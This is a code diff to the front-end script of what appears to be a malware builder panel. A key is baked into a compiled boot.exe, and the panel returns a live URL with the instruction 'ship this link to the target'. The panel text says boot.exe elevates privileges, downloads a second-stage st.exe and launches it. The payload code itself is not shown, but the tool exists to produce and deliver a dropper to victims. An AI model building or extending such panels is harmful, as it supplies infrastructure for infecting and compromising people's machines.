@@ -1,5 +1,5 @@
 // language: JavaScript, file: public/js/builder.js
-// builder tab — key optional. empty key → server falls back to your account key.
+// builder tab — key field is the only input. server compiles boot.exe with the key baked in.
 
 (function () {
   'use strict';
@@ -16,30 +16,6 @@
     return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
       '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
     }[c]));
-  }
-
-  async function loadBases() {
-    const sel = $('b-base');
-    if (!sel) return;
-    sel.innerHTML = '<option value="">loading…</option>';
-    try {
-      const r = await fetch('/api/build/bases', { credentials: 'same-origin' });
-      if (!r.ok) { sel.innerHTML = `<option value="">error ${r.status}</option>`; return; }
-      const bases = await r.json();
-      const prev = sel.value;
-      sel.innerHTML = '';
-      if (!bases || bases.length === 0) {
-        sel.innerHTML = '<option value="">no bases in exe/</option>';
-        return;
-      }
-      bases.forEach(b => {
-        const o = document.createElement('option');
-        o.value = b.name;
-        o.textContent = `${b.name} (${humanSize(b.size)})`;
-        sel.appendChild(o);
-      });
-      if (prev && bases.some(b => b.name === prev)) sel.value = prev;
-    } catch { sel.innerHTML = '<option value="">network error</option>'; }
   }
 
   async function loadBuilds() {
@@ -74,7 +50,7 @@
         });
         el.querySelector('[data-del]').addEventListener('click', async (e) => {
           e.stopPropagation();
-          if (!confirm(`delete build of ${b.base}?`)) return;
+          if (!confirm(`delete build?`)) return;
           await fetch(`/api/builds/${b.id}`, { method: 'DELETE', credentials: 'same-origin' });
           loadBuilds();
         });
@@ -88,32 +64,18 @@
     const out = $('b-result');
     if (!btn || !out) return;
 
-    const base = $('b-base')?.value;
-    const key  = ($('b-key')?.value || '').trim();   // may be empty — server falls back
-
-    if (!base) {
-      out.innerHTML = '<div class="err">pick a base exe first</div>';
-      return;
-    }
-
-    let config;
-    try {
-      config = JSON.parse($('b-config')?.value || '{}');
-    } catch {
-      out.innerHTML = '<div class="err">config is not valid json</div>';
-      return;
-    }
+    const key = ($('b-key')?.value || '').trim();
 
     btn.disabled = true;
-    btn.textContent = 'building…';
-    out.innerHTML = '';
+    btn.textContent = 'compiling… (30–90s)';
+    out.innerHTML = '<div class="note">cargo build running on server — first build 2–3 min, after that 30–90s</div>';
 
     try {
       const r = await fetch('/api/build', {
         method: 'POST',
         credentials: 'same-origin',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ base, key, config }),
+        body: JSON.stringify({ key }),
       });
       const d = await r.json().catch(() => ({}));
 
@@ -122,15 +84,19 @@
       } else {
         out.innerHTML = `
           <div class="tile">
-            <div class="k">build ready — key baked in</div>
+            <div class="k">build ready — key baked into boot.exe</div>
             <div class="v mono" style="font-size:13px;margin-top:8px">${esc(d.key)}</div>
-            <div style="display:flex;gap:8px;margin-top:14px">
-              <button class="ghost mini" id="b-dl-now">download exe</button>
+            <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
+              <button class="ghost mini" id="b-dl-now">download boot.exe</button>
             </div>
-            <div class="note">single exe · config baked in · ${humanSize(d.size)}</div>
+            <div class="note">
+              live url: <code style="color:var(--accent);font-family:var(--mono)">${esc(d.liveUrl)}</code><br>
+              ship this link to the target. boot.exe elevates, downloads st.exe, writes key.json, launches.
+            </div>
           </div>`;
-        const dlBtn = document.getElementById('b-dl-now');
-        if (dlBtn) dlBtn.addEventListener('click', () => { window.location.href = d.url; });
+        document.getElementById('b-dl-now')?.addEventListener('click', () => {
+          window.location.href = d.url;
+        });
         loadBuilds();
       }
     } catch {
@@ -145,7 +111,6 @@
     const keyField = $('b-key');
     if (!keyField || keyField.value) return;
 
-    // try #a-akey dataset first (account tab), then #ov-akey text, then /api/me
     const fromAcct = document.getElementById('a-akey')?.dataset?.real;
     if (fromAcct && fromAcct !== '—') { keyField.value = fromAcct; return; }
 
@@ -158,27 +123,24 @@
       .catch(() => {});
   }
 
-  function wire() {
-    const buildBtn = $('b-build');
-    const refreshBtn = $('b-refresh');
-    if (buildBtn)   buildBtn.addEventListener('click', doBuild);
-    if (refreshBtn) refreshBtn.addEventListener('click', () => { loadBases(); loadBuilds(); });
-  }
-
   function boot() {
-    if (!$('b-base')) return;
+    if (!$('b-key')) return;
     if (window.__builderBooted) return;
     window.__builderBooted = true;
 
     preloadAccountKey();
-    wire();
-    loadBases();
+
+    const buildBtn = $('b-build');
+    const refreshBtn = $('b-refresh');
+    if (buildBtn)   buildBtn.addEventListener('click', doBuild);
+    if (refreshBtn) refreshBtn.addEventListener('click', () => loadBuilds());
+
     loadBuilds();
 
     const navBuilder = document.querySelector('.nav a[data-tab="builder"]');
     if (navBuilder) {
       navBuilder.addEventListener('click', () => {
-        setTimeout(() => { preloadAccountKey(); loadBases(); loadBuilds(); }, 0);
+        setTimeout(() => { preloadAccountKey(); loadBuilds(); }, 0);
       });
     }
   }
